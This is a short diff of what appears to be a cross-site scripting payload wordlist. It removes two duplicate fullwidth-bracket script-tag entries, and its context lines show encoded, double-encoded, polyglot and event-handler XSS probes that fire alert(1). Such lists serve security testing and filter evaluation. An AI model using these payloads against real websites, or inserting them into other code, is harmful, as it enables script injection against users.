@@ -105,7 +105,6 @@
 \u003Cscript\u003Ealert(1)\u003C/script\u003E
 \x3Cscript\x3Ealert(1)\x3C/script\x3E
 \74script\76alert(1)\74/script\76
-＜script＞alert(1)＜/script＞
 <script>//alert(1)</script>
 <script><!--alert(1)--></script>
 <script><!--//--><![CDATA[//><!--alert(1)//--><!]]></script>
@@ -186,7 +185,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 </textarea><svg/onload=alert(1)>
 %253Cscript%253Ealert(1)%253C%252Fscript%253E
 %25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
-＜script＞alert(1)＜/script＞
 <image src=x onerror=alert(1)>
 <image src=1 onerror=alert(1)>
 <isindex action="javascript:alert(1)" type=image>
